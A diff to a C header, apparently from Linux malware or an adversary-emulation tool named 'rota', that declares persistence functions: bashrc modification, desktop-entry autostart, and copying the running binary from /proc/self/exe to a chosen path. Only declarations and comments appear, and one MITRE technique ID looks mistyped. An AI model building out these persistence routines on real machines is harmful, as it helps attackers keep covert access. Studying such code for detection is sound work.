@@ -2,7 +2,6 @@
 #define PERSISTENCE_H_
 #include <stdbool.h>
 
-
 /**
 * @brief append to bashrc for persistence
 * Technique: Event Triggered Execution: Unix Shell Configuration Modification (T154.004)
@@ -20,10 +19,18 @@ bool nonroot_bashrc_persistence(void);
 **/
 bool nonroot_desktop_persistence(void);
 
-bool copy_rota_to_userland(void);
+
+/**
+ * @brief copy binary by reading it from /proc/self/exe to destpath
+ * @param destpath, designated path to write to.
+ *
+ * @return boolean value indicating success/failure.
+ **/
+bool copy_rota_to_userland(char *destpath);
 
 /**
  * @brief wrapper function to call additional non-root persistence functions
+ * required directories are created at execution time for planting the binary.
  * @param N/A
  * @return boolean value indicating success or failureof non-root persistence methods.
 */
